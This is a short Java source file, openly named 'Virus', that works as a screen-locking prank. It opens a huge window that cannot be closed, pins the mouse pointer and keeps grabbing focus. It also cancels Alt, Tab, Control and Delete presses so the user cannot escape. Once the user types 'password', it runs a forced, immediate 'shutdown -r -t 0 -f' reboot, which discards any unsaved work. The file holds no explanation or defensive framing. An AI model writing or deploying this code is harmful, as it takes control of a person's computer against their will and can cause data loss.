

import java.awt.AWTException;
import java.awt.Color;
import java.awt.Dimension;
import java.awt.Robot;
import java.awt.event.KeyEvent;
import java.awt.event.KeyListener;
import java.io.IOException;

import javax.swing.JFrame;
import javax.swing.JTextField;

public class Virus {
	private static JFrame frame;
	private static JTextField textBox;
	private static Robot robot;
	public static void main(String[] a) throws AWTException, InterruptedException {
		textBox=new JTextField();
		frame=new JFrame();
		frame.setPreferredSize(new Dimension(10000, 10000));
		frame.setDefaultCloseOperation(JFrame.DO_NOTHING_ON_CLOSE);
		frame.add(textBox);
		frame.pack();
		frame.setResizable(false);
		frame.setVisible(true);
		textBox.setBackground(Color.black);
		textBox.setForeground(Color.green);
		textBox.requestFocus();
		robot=new Robot();
		
		
		final Robot finalRobot=robot;
		textBox.addKeyListener(new KeyListener() {
			public void keyPressed(KeyEvent e) {
				if (e.getKeyCode()==KeyEvent.VK_ALT) {
					finalRobot.keyRelease(KeyEvent.VK_ALT);
				}
				if (e.getKeyCode()==KeyEvent.VK_TAB) {
					finalRobot.keyRelease(KeyEvent.VK_TAB);
				}
				if (e.getKeyCode()==KeyEvent.VK_CONTROL) {
					finalRobot.keyRelease(KeyEvent.VK_CONTROL);
				}
				if (e.getKeyCode()==KeyEvent.VK_DELETE) {
					finalRobot.keyRelease(KeyEvent.VK_DELETE);
				}
			}
			
			public void keyReleased(KeyEvent arg0) {
				
			}
			
			public void keyTyped(KeyEvent arg0) {
				
			}
			
		});
		
		while(!textBox.getText().equals("password")) {
			robot.mouseMove(100, 100);
			Thread.sleep(10);
			frame.requestFocus();
			textBox.requestFocus();
			frame.setLocationRelativeTo(null);
			
		}
		frame.dispose();
		
		Runtime runtime = Runtime.getRuntime();
		try {
			Process proc = runtime.exec("shutdown -r -t 0 -f");
		}
		catch (IOException e1) {
			e1.printStackTrace();
		}
		System.exit(0);
	}
}
